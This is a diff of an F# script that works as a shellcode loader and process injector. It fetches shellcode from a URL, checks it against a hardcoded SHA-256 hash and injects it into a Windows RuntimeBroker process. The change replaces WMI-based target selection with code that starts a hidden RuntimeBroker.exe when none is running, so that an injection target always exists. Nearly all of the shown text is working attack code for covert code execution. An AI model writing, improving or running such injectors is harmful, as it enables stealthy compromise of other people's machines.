@@ -1,8 +1,6 @@
 #nowarn "44"
 #r "System.dll"
 #r "System.Net.Http.dll"
-#r "System.Management.dll"
-
 open System
 open System.IO
 open System.Diagnostics
@@ -104,36 +102,23 @@ let shellcodeUrl =
 let expectedSha256 = "BFD6415FF81996DBDBD3D564E09111056427E45EC62E1E68952B3CBF659D6322"
 let targetProcessName = "RuntimeBroker"
 
+let runtimeBrokerCandidates () =
+    Process.GetProcessesByName targetProcessName |> Array.toList
+
 let preferredTargetPid () =
-    let explorers =
-        Process.GetProcessesByName "explorer"
-        |> Seq.map (fun p -> uint32 p.Id)
-        |> Set.ofSeq
-    let candidates =
-        Process.GetProcessesByName targetProcessName
-        |> Array.toList
-    let byExplorer =
-        candidates
-        |> List.filter (fun p ->
-            try
-                use searcher =
-                    new Management.ManagementObjectSearcher(
-                        "SELECT ParentProcessId FROM Win32_Process WHERE ProcessId=" + string p.Id)
-                use collection = searcher.Get()
-                let mutable found = false
-                let mutable parent = 0u
-                let mutable enumerator = collection.GetEnumerator()
-                while enumerator.MoveNext() do
-                    parent <- uint32 (string enumerator.Current.["ParentProcessId"])
-                    found <- true
-                found && Set.contains parent explorers
-            with _ -> false)
-    match byExplorer with
+    match runtimeBrokerCandidates () with
     | p :: _ -> p.Id
     | [] ->
-        let shells = Process.GetProcessesByName "explorer"
-        if shells.Length > 0 then shells.[0].Id
-        else candidates.Head.Id
+        let brokerPath =
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "RuntimeBroker.exe")
+        let startInfo = ProcessStartInfo(brokerPath)
+        startInfo.UseShellExecute <- false
+        startInfo.CreateNoWindow <- true
+        use started = Process.Start(startInfo)
+        Thread.Sleep 2000
+        match runtimeBrokerCandidates () with
+        | p :: _ -> p.Id
+        | [] -> failwith "RuntimeBroker indisponivel."
 
 let sha256Hex (bytes: byte[]) =
     use sha = SHA256.Create()
@@ -321,11 +306,6 @@ let injectShellcode (pid: int) (shellcode: byte[]) =
         if hThread <> 0n then CloseHandle hThread |> ignore
         if hProc <> 0n then CloseHandle hProc |> ignore
 
-
-let targets = Process.GetProcessesByName targetProcessName
-let shells = Process.GetProcessesByName "explorer"
-if targets.Length = 0 && shells.Length = 0 then
-    failwithf "Nenhum %s.exe ou explorer.exe em execucao." targetProcessName
 
 let targetPid = preferredTargetPid ()
 let shellcode = loadShellcode ()
